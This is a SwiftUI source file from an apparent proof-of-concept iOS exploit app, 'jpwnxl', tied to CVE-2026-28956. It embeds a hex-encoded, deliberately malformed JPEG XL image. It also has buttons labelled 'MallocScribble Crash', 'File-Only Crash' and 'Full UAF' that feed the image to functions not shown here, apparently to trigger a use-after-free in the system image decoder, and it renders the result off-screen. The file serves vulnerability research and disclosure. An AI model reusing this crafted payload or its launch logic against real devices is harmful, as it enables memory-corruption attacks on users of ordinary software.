//
//  jpwnxlview.swift
//  poc
//
//  Created by ruter on 18.05.26.
//

import SwiftUI
import UIKit
import ImageIO

struct jpwnxlview: View {
    @EnvironmentObject var state: appinfo
    @State private var image: UIImage?
    @State private var running = false
    
    let hex = """
        0000000c4a584c200d0a870a00000014667479706a786c20000000006a78
        6c20000000006a786c63ff0a1073ff404b2032203500c8bf062000003400
        4b20120c20202020202020350048bf06013c0034004b20120c2020202020
        20203500c8bf06200000340000006a786c20000000006a786c63ff0a1073
        ff404b2032203500c8bf0620000034004b20120c202020202020203500
        """
    
    var body: some View {
        NavigationStack {
            List {
                Section {
                    Button("MallocScribble Crash") {
                        image = simplejxl(hex.replacingOccurrences(of: "\n", with: ""))
                    }
                    .disabled(!state.mallocscribble)

                    Button("File-Only Crash") {
                        fileonlyjxl(selfgroominghex(hex.replacingOccurrences(of: "\n", with: "")))
                    }
                    
                    Button(running ? "Running UAF..." : "Full UAF") {
                        running = true
                        jpwnxl(hex.replacingOccurrences(of: "\n", with: "")) { _ in
                            running = false
                        }
                    }
                    .disabled(running)
                } header: {
                    Label("Exploit", systemImage: "ladybug")
                } footer: {
                    if !state.mallocscribble {
                        Text("MallocScribble must be enabled via debugger for \"MallocScribble Crash\" to work.")
                    }
                }
                
                Section {
                    creditsrow(name: "roooot", role: "Main Developer", profile: URL(string: "https://github.com/rooootdev")!)
                    creditsrow(name: "BaconMania", role: "Help with PoC", profile: URL(string: "https://github.com/baconium")!)
                    creditsrow(name: "impost0r", role: "CVE-2026-28956", profile: URL(string: "https://github.com/impost0r")!)
                } header: {
                    Label("Credits", systemImage: "person.crop.circle")
                }
            }
            .navigationTitle("jpwnxl")
        }
        .overlay {
            Image(uiImage: image ?? UIImage())
                .position(x: -10000, y: -10000)
        }
    }
}
